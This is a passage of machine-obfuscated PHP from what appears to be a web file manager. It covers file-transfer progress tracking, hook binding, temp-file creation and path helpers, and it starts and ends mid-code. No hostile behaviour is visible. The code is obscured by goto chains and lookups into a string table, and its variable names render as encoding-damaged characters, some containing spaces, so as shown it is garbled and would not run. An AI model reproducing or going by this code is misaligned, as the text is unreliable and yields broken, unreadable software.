self::log($DË×ô´­®[1529] . json_encode_force($dÚÙƒë×â)); } if (!$dâ”‚æ¤ ¹ || !$DÎ¯º¡Ê¿Û[$DË×ô´­®[392]]) { return !1; } $E ¹ÓÕñ÷Ş = array($DË×ô´­®[29] => $DË×ô´­®[1528], $DË×ô´­®[1508] => USER_ID, $DË×ô´­®[93] => $dâ”‚æ¤ ¹, $DË×ô´­®[371] => $b Üœíˆ¾»); goto aˆØˆÃ‰ÓÉ; c†¢Ã¿ó¯: $DË×ô´­® =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$DÎ¯º¡Ê¿Û) { return Model($DË×ô´­®[423])->where(array($DË×ô´­®[93] => $dâ”‚æ¤ ¹, $DË×ô´­®[29] => $DË×ô´­®[1528]))->delete(); } $b Üœíˆ¾» = json_encode($DÎ¯º¡Ê¿Û); goto bÔ½Àæ¨°; aˆØˆÃ‰ÓÉ: Model($DË×ô´­®[423])->add($E ¹ÓÕñ÷Ş, array(), !0); goto d£Ëã‰†‹; d£Ëã‰†‹: } public static function log($C²ó¥çÔó½) { if (!GLOBAL_DEBUG) { return; } write_log($C²ó¥çÔó½, $_SERVER[Ïº«‚ßèÔˆø][1530]); } } class TaskFileTransfer extends Task { protected function startAfter() { goto e½Õ›§‚; BÕçÍğ¼´: $eÕ„ Õùâ¬[$c±•·êî†[1549]] = LNG($c±•·êî†[1550]); $eÕ„ Õùâ¬[$c±•·êî†[1551]] = 0; $eÕ„ Õùâ¬[$c±•·êî†[1552]] = 0; goto f—ä¬‚ËÚ“; c’–ïÏÎ±â: $eÕ„ Õùâ¬[$c±•·êî†[1555]] = 0; $eÕ„ Õùâ¬[$c±•·êî†[1556]] = 0; if (!$eÕ„ Õùâ¬[$c±•·êî†[1414]]) { $eÕ„ Õùâ¬[$c±•·êî†[1414]] = LNG($c±•·êî†[1557]); } goto A´˜ù¡Âßœ; Aº½¶Ü: Hook::bind($c±•·êî†[538], array($this, $c±•·êî†[1539])); Hook::bind($c±•·êî†[540], array($this, $c±•·êî†[1539])); Hook::bind($c±•·êî†[542], array($this, $c±•·êî†[1539])); goto EƒĞ×µÏÍ´; EƒĞ×µÏÍ´: Hook::bind($c±•·êî†[1540], array($this, $c±•·êî†[1541])); Hook::bind($c±•·êî†[558], array($this, $c±•·êî†[1542])); $this->sourceModelCopyFlag = !1; goto cñö¿„‹£Ù; a‡¶§ïŒ®: Hook::bind($c±•·êî†[565], array($this, $c±•·êî†[1536])); Hook::bind($c±•·êî†[566], array($this, $c±•·êî†[1537])); Hook::bind($c±•·êî†[568], array($this, $c±•·êî†[1538])); goto aêÔÄ‰µó; f—ä¬‚ËÚ“: $eÕ„ Õùâ¬[$c±•·êî†[1007]] = $c±•·êî†[33]; $eÕ„ Õùâ¬[$c±•·êî†[1553]] = $c±•·êî†[33]; $eÕ„ Õùâ¬[$c±•·êî†[1554]] = 0; goto c’–ïÏÎ±â; cñö¿„‹£Ù: Hook::bind($c±•·êî†[1543], array($this, $c±•·êî†[1544])); Hook::bind($c±•·êî†[1545], array($this, $c±•·êî†[1546])); Hook::bind($c±•·êî†[1547], array($this, $c±•·êî†[1548])); goto BÕçÍğ¼´; Fó°×…àğà: Hook::bind($c±•·êî†[1531], array($this, $c±•·êî†[1532])); Hook::bind($c±•·êî†[1093], array($this, $c±•·êî†[1533])); Hook::bind($c±•·êî†[1534], array($this, $c±•·êî†[1535])); goto a‡¶§ïŒ®; aêÔÄ‰µó: Hook::bind($c±•·êî†[569], array($this, $c±•·êî†[1538])); Hook::bind($c±•·êî†[536], array($this, $c±•·êî†[1539])); Hook::bind($c±•·êî†[533], array($this, $c±•·êî†[1539])); goto Aº½¶Ü; e½Õ›§‚: $c±•·êî† =& $_SERVER[Ïº«‚ßèÔˆø]; $eÕ„ Õùâ¬ =& $this->task; $this->sourceCopyFolder = !1; goto Fó°×…àğà; A´˜ù¡Âßœ: } protected function endAfter() { goto EÎ±§¡—‚¦; c½êŒÊĞ©Ä: Hook::unbind($CñÙ™ÂİË·[542], array($this, $CñÙ™ÂİË·[1539])); Hook::unbind($CñÙ™ÂİË·[1540], array($this, $CñÙ™ÂİË·[1541])); Hook::unbind($CñÙ™ÂİË·[558], array($this, $CñÙ™ÂİË·[1542])); goto e¬†È†Œœ; aÀÌ¾ö¸Ïê: Hook::unbind($CñÙ™ÂİË·[533], array($this, $CñÙ™ÂİË·[1539])); Hook::unbind($CñÙ™ÂİË·[538], array($this, $CñÙ™ÂİË·[1539])); Hook::unbind($CñÙ™ÂİË·[540], array($this, $CñÙ™ÂİË·[1539])); goto c½êŒÊĞ©Ä; DÇà‹ùó”²: Hook::unbind($CñÙ™ÂİË·[568], array($this, $CñÙ™ÂİË·[1538])); Hook::unbind($CñÙ™ÂİË·[569], array($this, $CñÙ™ÂİË·[1538])); Hook::unbind($CñÙ™ÂİË·[536], array($this, $CñÙ™ÂİË·[1539])); goto aÀÌ¾ö¸Ïê; Fõô÷è Ùí: Hook::unbind($CñÙ™ÂİË·[1534], array($this, $CñÙ™ÂİË·[1535])); Hook::unbind($CñÙ™ÂİË·[565], array($this, $CñÙ™ÂİË·[1536])); Hook::unbind($CñÙ™ÂİË·[566], array($this, $CñÙ™ÂİË·[1537])); goto DÇà‹ùó”²; e¬†È†Œœ: Hook::unbind($CñÙ™ÂİË·[1543], array($this, $CñÙ™ÂİË·[1544])); Hook::unbind($CñÙ™ÂİË·[1545], array($this, $CñÙ™ÂİË·[1546])); Hook::unbind($CñÙ™ÂİË·[1547], array($this, $CñÙ™ÂİË·[1548])); goto fÉ»©“ßåÁ; EÎ±§¡—‚¦: $CñÙ™ÂİË· =& $_SERVER[Ïº«‚ßèÔˆø]; Hook::unbind($CñÙ™ÂİË·[1531], array($this, $CñÙ™ÂİË·[1532])); Hook::unbind($CñÙ™ÂİË·[1093], array($this, $CñÙ™ÂİË·[1533])); goto Fõô÷è Ùí; fÉ»©“ßåÁ: } public function copyMoveStart($c‡â…´¸‡, $Dš›ßÒÙËŸ, $A‹†š Ó›, $A•‘Ã’ß) { goto Cæìø¬«¬–; C™Šî¤¨¤’: if (substr($Dš›ßÒÙËŸ, 0, strlen($AÎŞäé™Œ)) == $AÎŞäé™Œ) { return; } if (substr($A•‘Ã’ß, 0, strlen($AÎŞäé™Œ)) == $AÎŞäé™Œ) { return; } $A†ÈÏ×É =& $this->task; goto Fôõ‹‚Šã; Fôõ‹‚Šã: $A†ÈÏ×É[$a™ƒÇêˆØ¥[1559]] = KodIO::transferType($c‡â…´¸‡, $A‹†š Ó›); $this->update(); goto cÜÄô˜Õ‚à; Cæìø¬«¬–: $a™ƒÇêˆØ¥ =& $_SERVER[Ïº«‚ßèÔˆø]; self::log($a™ƒÇêˆØ¥[1558] . $Dš›ßÒÙËŸ . $a™ƒÇêˆØ¥[67] . $A•‘Ã’ß); $AÎŞäé™Œ = rtrim(TEMP_FILES, $a™ƒÇêˆØ¥[8]); goto C™Šî¤¨¤’; cÜÄô˜Õ‚à: } public function updateAfter() { goto bŠ°…Àß¾©; d­ ¯´â£š: if ($this->sourceModelCopyFlag) { return; } if ($A‚è¯îéÄ[$cªíèŞ²±¤[1559]] == $cªíèŞ²±¤[1164]) { return; } if ($A‚è¯îéÄ[$cªíèŞ²±¤[1559]] == $cªíèŞ²±¤[1077] || $A‚è¯îéÄ[$cªíèŞ²±¤[1559]] == $cªíèŞ²±¤[107]) { if ($A‚è¯îéÄ[$cªíèŞ²±¤[1553]]) { $A‚è¯îéÄ[$cªíèŞ²±¤[1556]] = $A‚è¯îéÄ[$cªíèŞ²±¤[1555]] + $A‚è¯îéÄ[$cªíèŞ²±¤[1552]]; } } else { if ($A‚è¯îéÄ[$cªíèŞ²±¤[1559]] == $cªíèŞ²±¤[1165]) { if ($A‚è¯îéÄ[$cªíèŞ²±¤[1553]] == $cªíèŞ²±¤[1077]) { $A‚è¯îéÄ[$cªíèŞ²±¤[1556]] = $A‚è¯îéÄ[$cªíèŞ²±¤[1555]] + $A‚è¯îéÄ[$cªíèŞ²±¤[1552]] * 0.5; } else { if ($A‚è¯îéÄ[$cªíèŞ²±¤[1553]] == $cªíèŞ²±¤[107]) { $A‚è¯îéÄ[$cªíèŞ²±¤[1556]] = $A‚è¯îéÄ[$cªíèŞ²±¤[1555]] + $A‚è¯îéÄ[$cªíèŞ²±¤[1551]] * 0.5 + $A‚è¯îéÄ[$cªíèŞ²±¤[1552]] * 0.5; } } } } goto EæŞá”õÓï; EæŞá”õÓï: $A‚è¯îéÄ[$cªíèŞ²±¤[1509]] = $A‚è¯îéÄ[$cªíèŞ²±¤[1556]] / $A‚è¯îéÄ[$cªíèŞ²±¤[707]]; if ($A‚è¯îéÄ[$cªíèŞ²±¤[1509]] > 0) { $Eò·…¯Ìö½ = timeFloat() - $A‚è¯îéÄ[$cªíèŞ²±¤[733]] - $A‚è¯îéÄ[$cªíèŞ²±¤[1512]]; $A‚è¯îéÄ[$cªíèŞ²±¤[1513]] = $Eò·…¯Ìö½ * (1 - $A‚è¯îéÄ[$cªíèŞ²±¤[1509]]) / $A‚è¯îéÄ[$cªíèŞ²±¤[1509]]; } goto C£íŞÉùóÕ; bŠ°…Àß¾©: $cªíèŞ²±¤ =& $_SERVER[Ïº«‚ßèÔˆø]; $A‚è¯îéÄ =& $this->task; if (!$A‚è¯îéÄ[$cªíèŞ²±¤[707]]) { return; } goto d­ ¯´â£š; C£íŞÉùóÕ: } public function addPath($A¥áóÁ°—) { goto d–˜Ú÷; aÈ´¨ëŒ²: if ($D¹¢ô´Üœç[$D¯‡¯½êøÔ[29]] == $D¯‡¯½êøÔ[192]) { $aš£Õ•¸À§[$D¯‡¯½êøÔ[1005]] += 1; } else { $aš£Õ•¸À§[$D¯‡¯½êøÔ[1005]] += $D¹¢ô´Üœç[$D¯‡¯½êøÔ[81]][$D¯‡¯½êøÔ[79]]; if ($D¹¢ô´Üœç[$D¯‡¯½êøÔ[394]]) { $aš£Õ•¸À§[$D¯‡¯½êøÔ[1005]] += $D¹¢ô´Üœç[$D¯‡¯½êøÔ[81]][$D¯‡¯½êøÔ[80]] + 1; } } $aš£Õ•¸À§[$D¯‡¯½êøÔ[707]] += $D¹¢ô´Üœç[$D¯‡¯½êøÔ[78]]; $this->update(); goto f·Â‡á–Ì‡; cğŠÒùí¯Ì: $D¹¢ô´Üœç = IO::infoWithChildren($A¥áóÁ°—); $E¿ªªÃÊ¬† = $aš£Õ•¸À§[$D¯‡¯½êøÔ[1560]] ? $aš£Õ•¸À§[$D¯‡¯½êøÔ[1560]][$D¯‡¯½êøÔ[1561]] : 0; $aš£Õ•¸À§[$D¯‡¯½êøÔ[1560]] = array($D¯‡¯½êøÔ[1561] => $E¿ªªÃÊ¬† + 1, $D¯‡¯½êøÔ[411] => $D¹¢ô´Üœç[$D¯‡¯½êøÔ[28]], $D¯‡¯½êøÔ[76] => $D¹¢ô´Üœç[$D¯‡¯½êøÔ[76]], $D¯‡¯½êøÔ[493] => $D¹¢ô´Üœç[$D¯‡¯½êøÔ[493]] ? $D¹¢ô´Üœç[$D¯‡¯½êøÔ[493]] : $D¹¢ô´Üœç[$D¯‡¯½êøÔ[76]]); goto aÈ´¨ëŒ²; d–˜Ú÷: $D¯‡¯½êøÔ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$A¥áóÁ°—) { return; } $aš£Õ•¸À§ =& $this->task; goto cğŠÒùí¯Ì; f·Â‡á–Ì‡: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($FÕƒâã´¾·) { $dÅ¬‰‰¡ôË =& $_SERVER[Ïº«‚ßèÔˆø]; $dĞÓ·°¥Î =& $this->task; $dĞÓ·°¥Î[$dÅ¬‰‰¡ôË[1549]] = $FÕƒâã´¾·[$dÅ¬‰‰¡ôË[28]]; $dĞÓ·°¥Î[$dÅ¬‰‰¡ôË[1007]] = $FÕƒâã´¾·[$dÅ¬‰‰¡ôË[28]]; $this->update(); } public function copyFileStart($cˆªîßŸÅæ, $FÈÙË·‹–¦, $f–âìàğĞ†, $aó¬½ËÒï», $aŠÛ‹óÅ, $dÀƒõÊ¤İÒ) { goto aŠ÷²ƒ á“; bÈ›•‘Â: $B©£ëÚŠë[$dİ‘‡ÛĞ­¬[1549]] = $eÜ—õƒáçĞ; $B©£ëÚŠë[$dİ‘‡ÛĞ­¬[1551]] = (int) $cˆªîßŸÅæ->size($FÈÙË·‹–¦); $B©£ëÚŠë[$dİ‘‡ÛĞ­¬[1552]] = 0; goto D”èË¿Ù˜£; aŠ÷²ƒ á“: $dİ‘‡ÛĞ­¬ =& $_SERVER[Ïº«‚ßèÔˆø]; $eÜ—õƒáçĞ = $aŠÛ‹óÅ; if ($eÜ—õƒáçĞ == $GLOBALS[$dİ‘‡ÛĞ­¬[1562]]) { $eÜ—õƒáçĞ = $GLOBALS[$dİ‘‡ÛĞ­¬[1563]]; } goto F‚ëõïÊ¸ø; F‚ëõïÊ¸ø: $GLOBALS[$dİ‘‡ÛĞ­¬[1563]] = $aŠÛ‹óÅ; $GLOBALS[$dİ‘‡ÛĞ­¬[1562]] = $dÀƒõÊ¤İÒ; $B©£ëÚŠë =& $this->task; goto bÈ›•‘Â; D”èË¿Ù˜£: $B©£ëÚŠë[$dİ‘‡ÛĞ­¬[1007]] = $dİ‘‡ÛĞ­¬[33]; $B©£ëÚŠë[$dİ‘‡ÛĞ­¬[1553]] = $dİ‘‡ÛĞ­¬[33]; $B©£ëÚŠë[$dİ‘‡ÛĞ­¬[1554]] = 0; goto BÛø´‡îìÌ; BÛø´‡îìÌ: $this->update(); goto D¾ˆŸ°œĞ; D¾ˆŸ°œĞ: } public function copyFileEnd($e‘ˆâòóË¬, $F¹Ö«ÁÓÁÒ, $b…ŸŒ, $eğ‹®‘İ‘, $fÃ¹ƒ¤Áöå, $cò«óËÏâÈ) { $ašÂ¼è´Å± =& $_SERVER[Ïº«‚ßèÔˆø]; $Eµ„¾Ó“œŠ =& $this->task; $Eµ„¾Ó“œŠ[$ašÂ¼è´Å±[1552]] = $Eµ„¾Ó“œŠ[$ašÂ¼è´Å±[1551]]; $Eµ„¾Ó“œŠ[$ašÂ¼è´Å±[1553]] = $ašÂ¼è´Å±[33]; if ($fÃ¹ƒ¤Áöå == $Eµ„¾Ó“œŠ[$ašÂ¼è´Å±[1549]]) { $Eµ„¾Ó“œŠ[$ašÂ¼è´Å±[1555]] += $Eµ„¾Ó“œŠ[$ašÂ¼è´Å±[1551]]; $Eµ„¾Ó“œŠ[$ašÂ¼è´Å±[1556]] = $Eµ„¾Ó“œŠ[$ašÂ¼è´Å±[1555]]; $this->update(1); } else { $this->update(); $Eµ„¾Ó“œŠ[$ašÂ¼è´Å±[1552]] = 0; } self::log($ašÂ¼è´Å±[1564] . $F¹Ö«ÁÓÁÒ . $ašÂ¼è´Å±[67] . $eğ‹®‘İ‘ . $ašÂ¼è´Å±[228] . $fÃ¹ƒ¤Áöå . $ašÂ¼è´Å±[1565] . $Eµ„¾Ó“œŠ[$ašÂ¼è´Å±[1549]]); } public function updateFileEnd($e¶£ÏÍº, $Dêã¨Ç) { goto dÖ•…Ñøµ÷; FÚ²¦ø­Ş: $this->update(1); self::log($Fƒ™ çŒ‡[1566] . $e¶£ÏÍº); goto eŞÆ™Ùà™; dÖ•…Ñøµ÷: $Fƒ™ çŒ‡ =& $_SERVER[Ïº«‚ßèÔˆø]; $aİˆ§‹¡ß‹ =& $this->task; $aİˆ§‹¡ß‹[$Fƒ™ çŒ‡[1549]] = $e¶£ÏÍº; goto f¼¡ä³«å¦; f¼¡ä³«å¦: $aİˆ§‹¡ß‹[$Fƒ™ çŒ‡[1551]] = $Dêã¨Ç; $aİˆ§‹¡ß‹[$Fƒ™ çŒ‡[1555]] += $Dêã¨Ç; $aİˆ§‹¡ß‹[$Fƒ™ çŒ‡[1556]] = $aİˆ§‹¡ß‹[$Fƒ™ çŒ‡[1555]]; goto FÚ²¦ø­Ş; eŞÆ™Ùà™: } public function sourceModelCopy($a¸Ò“–«) { goto E²öÔÄÌ“Ù; F¥Ï±–ìÀ: switch ($cƒæÆï°Ÿ›) { case $c‰×¬‘çô[534]: $eµœĞÍ­» = 1; break; case $c‰×¬‘çô[537]: $eŸ‹ÊÊÅ´[$c‰×¬‘çô[1549]] = $bêÆ¼Øª«Ô[$c‰×¬‘çô[28]]; break; case $c‰×¬‘çô[539]: $eµœĞÍ­» = intval($a¸Ò“–«[$c‰×¬‘çô[376]] * 0.4); break; case $c‰×¬‘çô[541]: $eµœĞÍ­» = intval($a¸Ò“–«[$c‰×¬‘çô[376]] * 0.2); break; case $c‰×¬‘çô[543]: $eµœĞÍ­» = intval($a¸Ò“–«[$c‰×¬‘çô[376]] * 0.4); break; } $this->update($eµœĞÍ­»); $this->sourceModelCopyFlag = !1; goto FØ•öÍ¤İ½; DÙŠõÓßàÀ: $eŸ‹ÊÊÅ´ =& $this->task; $this->sourceModelCopyFlag = !0; $eµœĞÍ­» = 0; goto F¥Ï±–ìÀ; E²öÔÄÌ“Ù: $c‰×¬‘çô =& $_SERVER[Ïº«‚ßèÔˆø]; $cƒæÆï°Ÿ› = $a¸Ò“–«[0]; $bêÆ¼Øª«Ô = $a¸Ò“–«[1]; goto DÙŠõÓßàÀ; FØ•öÍ¤İ½: } public function sourceRemove($C¸‹ÅİÎ¤å, $D£–¥ãøÁ) { $e‡µôŞò« =& $_SERVER[Ïº«‚ßèÔˆø]; $this->sourceModelCopyFlag = !0; $e‡ÈÈÁ÷‹… = 1; if (isset($C¸‹ÅİÎ¤å[$e‡µôŞò«[81]])) { $e‡ÈÈÁ÷‹… = $C¸‹ÅİÎ¤å[$e‡µôŞò«[81]][$e‡µôŞò«[79]] + $C¸‹ÅİÎ¤å[$e‡µôŞò«[81]][$e‡µôŞò«[80]] + 1; } $this->update($e‡ÈÈÁ÷‹…); $this->sourceModelCopyFlag = !1; } public function sourceMove($cÏÕ¦ŸïÓÚ) { $this->sourceRemove($cÏÕ¦ŸïÓÚ, !1); } public function curlProgress($c‘Ëì¹Ñ‚á, $AİÛÖ“Ëá, $F¯æ—×î‰¾, $E£ÇÇ§ÈÂø, $F¤›°“¹îñ) { $a‘ç÷àèÕ¥ =& $_SERVER[Ïº«‚ßèÔˆø]; $C†•’ÕæØ =& $this->task; if ($F¤›°“¹îñ > 0) { $C†•’ÕæØ[$a‘ç÷àèÕ¥[1007]] = $a‘ç÷àèÕ¥[1567]; $C†•’ÕæØ[$a‘ç÷àèÕ¥[1553]] = $a‘ç÷àèÕ¥[107]; if ($C†•’ÕæØ[$a‘ç÷àèÕ¥[1551]]) { $C†•’ÕæØ[$a‘ç÷àèÕ¥[1552]] = $F¤›°“¹îñ; } if ($C†•’ÕæØ[$a‘ç÷àèÕ¥[1554]]) { $C†•’ÕæØ[$a‘ç÷àèÕ¥[1552]] = $F¤›°“¹îñ + $C†•’ÕæØ[$a‘ç÷àèÕ¥[1554]]; } } else { if ($F¯æ—×î‰¾ > 0) { if ($C†•’ÕæØ[$a‘ç÷àèÕ¥[1551]] == $AİÛÖ“Ëá) { $C†•’ÕæØ[$a‘ç÷àèÕ¥[1552]] = $F¯æ—×î‰¾; $C†•’ÕæØ[$a‘ç÷àèÕ¥[1007]] = $a‘ç÷àèÕ¥[1568]; $C†•’ÕæØ[$a‘ç÷àèÕ¥[1553]] = $a‘ç÷àèÕ¥[1077]; } } } $this->update(); } public function curlProgressStart($dë±Ì«™Åß) { } public function curlProgressEnd($fÅÒ¯«÷„¿) { goto bæ»ë¸ª”ğ; FĞ¹ôäö°½: $this->update(); goto dŠÀ„¦–é; Cİ»Î‰ªÕù: $B­¸æéÄ = $D˜„«èìùˆ[$bÙ×Ö¥âÔã[1569]]; if ($B­¸æéÄ == -1) { $B­¸æéÄ = $D˜„«èìùˆ[$bÙ×Ö¥âÔã[1570]]; } if ($b„Ööà®´Â[$bÙ×Ö¥âÔã[1553]] == $bÙ×Ö¥âÔã[107] && $B­¸æéÄ) { $b„Ööà®´Â[$bÙ×Ö¥âÔã[1554]] += $B­¸æéÄ; } goto FĞ¹ôäö°½; bæ»ë¸ª”ğ: $bÙ×Ö¥âÔã =& $_SERVER[Ïº«‚ßèÔˆø]; $b„Ööà®´Â =& $this->task; $D˜„«èìùˆ = curl_getinfo($fÅÒ¯«÷„¿); goto Cİ»Î‰ªÕù; dŠÀ„¦–é: } } goto a‚­Ä–¤Õó; dÅ®ÉêÂ³÷: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $C¾Ÿ¸´¤¸Û =& $_SERVER[Ïº«‚ßèÔˆø]; $this->objectDriver = array($C¾Ÿ¸´¤¸Û[57], $C¾Ÿ¸´¤¸Û[58], $C¾Ÿ¸´¤¸Û[59], $C¾Ÿ¸´¤¸Û[60], $C¾Ÿ¸´¤¸Û[61], $C¾Ÿ¸´¤¸Û[62], $C¾Ÿ¸´¤¸Û[63], $C¾Ÿ¸´¤¸Û[64], $C¾Ÿ¸´¤¸Û[65]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($C‚íğĞ¾¨Ú) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($C‚íğĞ¾¨Ú, $_SERVER[Ïº«‚ßèÔˆø][8]); } return $C‚íğĞ¾¨Ú; } public function iconvApp($dÁÇƒ…÷‡ò) { return $dÁÇƒ…÷‡ò; } public function iconvSystem($fÁÏ—Üš) { return $fÁÏ—Üš; } public function iconvTo($D”†Ç¨Ÿ×, $aøí˜®¸à, $eñÕŸÉœ‰) { goto EÈĞÆÅ‘ÛÊ; Cˆ‚‚¯Ø‚ˆ: return $d‰öä‘ù; goto Cšğæ‡²½; a¬íÎ¼ˆç: $d‰öä‘ù = $d‰öä‘ù ? $d‰öä‘ù : $D”†Ç¨Ÿ×; if (strstr($d‰öä‘ù, $e°³ä´©º‚[70])) { $d‰öä‘ù = str_replace($e°³ä´©º‚[70], $e°³ä´©º‚[71], $d‰öä‘ù); } $cÕ¬½Åòó£[$aøí˜®¸à . $e°³ä´©º‚[67] . $eñÕŸÉœ‰ . $e°³ä´©º‚[68] . $D”†Ç¨Ÿ×] = $d‰öä‘ù; goto fà¼Ù¡­¿; fà¼Ù¡­¿: $cÕ¬½Åòó£[$eñÕŸÉœ‰ . $e°³ä´©º‚[67] . $aøí˜®¸à . $e°³ä´©º‚[68] . $D”†Ç¨Ÿ×] = $D”†Ç¨Ÿ×; $cÕ¬½Åòó£[$eñÕŸÉœ‰ . $e°³ä´©º‚[67] . $aøí˜®¸à . $e°³ä´©º‚[68] . $d‰öä‘ù] = $D”†Ç¨Ÿ×; $cÕ¬½Åòó£[$aøí˜®¸à . $e°³ä´©º‚[67] . $eñÕŸÉœ‰ . $e°³ä´©º‚[68] . $d‰öä‘ù] = $d‰öä‘ù; goto Cˆ‚‚¯Ø‚ˆ; a¹Çœ¼Âƒ²: $fºî¦ Ò ó = $aøí˜®¸à . $e°³ä´©º‚[67] . $eñÕŸÉœ‰ . $e°³ä´©º‚[68] . $D”†Ç¨Ÿ×; if (isset($cÕ¬½Åòó£[$fºî¦ Ò ó])) { return $cÕ¬½Åòó£[$fºî¦ Ò ó]; } if (function_exists($e°³ä´©º‚[69])) { $d‰öä‘ù = @mb_convert_encoding($D”†Ç¨Ÿ×, $eñÕŸÉœ‰, $aøí˜®¸à); } else { $d‰öä‘ù = @iconv($aøí˜®¸à, $eñÕŸÉœ‰, $D”†Ç¨Ÿ×); } goto a¬íÎ¼ˆç; EÈĞÆÅ‘ÛÊ: $e°³ä´©º‚ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$D”†Ç¨Ÿ× || !function_exists($e°³ä´©º‚[66])) { return $D”†Ç¨Ÿ×; } static $cÕ¬½Åòó£ = array(); goto a¹Çœ¼Âƒ²; Cšğæ‡²½: } public function getPathInner($bŸ³ºÄºé›) { $A†æÃ¾À˜­ = IO::init($bŸ³ºÄºé›); return $A†æÃ¾À˜­->path; } public function getPathOuter($D³Æ‚‚–ùä) { $DÚØèëÏí® =& $_SERVER[Ïº«‚ßèÔˆø]; $có‚ãÅòÛ = strlen(trim($this->pathBase, $DÚØèëÏí®[8])); $D³Æ‚‚–ùä = substr(trim($D³Æ‚‚–ùä, $DÚØèëÏí®[8]), $có‚ãÅòÛ); return $this->pathDriver . $DÚØèëÏí®[8] . ltrim($D³Æ‚‚–ùä, $DÚØèëÏí®[8]); } public function isParentOf($C®ŠŞ´æ¾§, $c©Ù°ºÉñê) { $DÃ…‚ƒ¥–„ =& $_SERVER[Ïº«‚ßèÔˆø]; $C®ŠŞ´æ¾§ = rtrim(strtolower($C®ŠŞ´æ¾§), $DÃ…‚ƒ¥–„[8]) . $DÃ…‚ƒ¥–„[8]; $c©Ù°ºÉñê = rtrim(strtolower($c©Ù°ºÉñê), $DÃ…‚ƒ¥–„[8]) . $DÃ…‚ƒ¥–„[8]; $Eàó¡Ï¨Ÿ = strpos($c©Ù°ºÉñê, $C®ŠŞ´æ¾§) === 0; return $Eàó¡Ï¨Ÿ; } public function getType() { $fÊ‚ò¢ˆïƒ =& $_SERVER[Ïº«‚ßèÔˆø]; $Fƒ™ÉÌŞ÷¶ = str_replace($fÊ‚ò¢ˆïƒ[72], $fÊ‚ò¢ˆïƒ[33], get_class($this)); return strtolower($Fƒ™ÉÌŞ÷¶); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($AÂ¾ÈÀİ†Š, $b±†ßËÙ­) { $dÅÔÃ½º¶Ç =& $_SERVER[Ïº«‚ßèÔˆø]; $D‰™¾İŸ© = rtrim($AÂ¾ÈÀİ†Š, $dÅÔÃ½º¶Ç[8]) . $dÅÔÃ½º¶Ç[8] . $b±†ßËÙ­; $e¹á™ƒÊª = $this->exist($D‰™¾İŸ©); return $e¹á™ƒÊª ? $D‰™¾İŸ© : !1; } public function setModifyTime($e‚‚ïö÷É, $eäŒ¨§à©ƒ = '') { } public function renameObject($dÂª†õäÍ‘, $cÇ±ãå„İî) { goto AößÇ¼š£; AößÇ¼š£: $dİâîÉ¹à =& $_SERVER[Ïº«‚ßèÔˆø]; $cİØÊ‡ëóï = $cÇ±ãå„İî; Hook::trigger($dİâîÉ¹à[73], $this, $dÂª†õäÍ‘, $this, $this->pathFather($dÂª†õäÍ‘) . $cÇ±ãå„İî); goto FÑØ¦­Åò–; FÑØ¦­Åò–: $dÂª†õäÍ‘ = $this->getPathOuter($dÂª†õäÍ‘); $cÇ±ãå„İî = $this->pathFather($dÂª†õäÍ‘) . $cÇ±ãå„İî; if (IO::isFile($dÂª†õäÍ‘)) { $då¨÷ÁÒ‘ = IO::copy($dÂª†õäÍ‘, $this->pathFather($dÂª†õäÍ‘), REPEAT_RENAME_FOLDER, $cİØÊ‡ëóï); if ($då¨÷ÁÒ‘) { IO::remove($dÂª†õäÍ‘); } } else { $då¨÷ÁÒ‘ = IO::mkdir($cÇ±ãå„İî); if (!$då¨÷ÁÒ‘) { return !1; } $fö°«ª = IO::listPath($dÂª†õäÍ‘, !0); $AöÖ˜ÖåŸø = array_merge($fö°«ª[$dİâîÉ¹à[74]], $fö°«ª[$dİâîÉ¹à[75]]); foreach ($AöÖ˜ÖåŸø as $d¸­ºè•ğƒ) { IO::move($d¸­ºè•ğƒ[$dİâîÉ¹à[76]], $cÇ±ãå„İî, REPEAT_RENAME_FOLDER); } IO::remove($dÂª†õäÍ‘); } goto E»½³î×ß; E»½³î×ß: return $då¨÷ÁÒ‘ ? $cÇ±ãå„İî : !1; goto BôïÆ¶ÒŠÓ; BôïÆ¶ÒŠÓ: } public function tempFile($cÌãîœ–… = '', $e£ó³ø£“‹ = '') { goto aøËøìÖ¯®; f”‚æ—Î†®: return $EÈ¡Ã¢Â¤; goto b”§ç¢´¢¼; föé“Í‘Á: $EÈ¡Ã¢Â¤ = $Dç³¯¡ö® . $cÌãîœ–…; @touch($EÈ¡Ã¢Â¤); if ($e£ó³ø£“‹) { file_put_contents($EÈ¡Ã¢Â¤, $e£ó³ø£“‹); } goto f”‚æ—Î†®; aøËøìÖ¯®: if (!$cÌãîœ–…) { $cÌãîœ–… = rand_string(15); } $Dç³¯¡ö® = TEMP_FILES . rand_string(15) . $_SERVER[Ïº«‚ßèÔˆø][8]; @mkdir($Dç³¯¡ö®, 511, !0); goto föé“Í‘Á; b”§ç¢´¢¼: } public function tempFileRemve($fË‰‰†åä) { @unlink($fË‰‰†åä); @rmdir($this->pathFather($fË‰‰†åä)); } public function mkfile($a…ğ£´šç, $E’ˆ–‚Ûùç = '', $Dİ„íéÉ = REPEAT_RENAME) { } public function mkdir($FŠ“¿‹—¹¬, $fƒä¤ğ§­‘ = REPEAT_SKIP) { } public function delFile($FÀ•·÷ßÏ) { } public function delFolder($f¦ğ–ùˆ®) { } public function copyFile($d¼ª˜ßŞŞÙ, $c¸«ùˆİ’–) { } public function moveFile($dĞà–ˆİŞ«, $A”³ÒÇ¤‰) { } public function remove($CÙ¹âî¦‹à) { if ($this->isFile($CÙ¹âî¦‹à)) { return $this->delFile($CÙ¹âî¦‹à); } return $this->delFolder($CÙ¹âî¦‹à); } public function rename($aÁò¦˜ƒ©, $EòÓ¹´Ë÷) { } public function exist($e›°²Å¤©) { } public function findByHash($c¤Ù¸¿È½Ã = '', $aƒœŒÑ©¼¨ = '') { return !1; } public function isFile($F¸À‡ù¤£Á) { } public function isFolder($aŒµôÁ”Á) { } public function size($e¾İ³·”¸) { } public function info($fÅä—ŒÌ„) { } public function infoSimple($EàŸù±“š¸) { return $this->info($EàŸù±“š¸); } public function 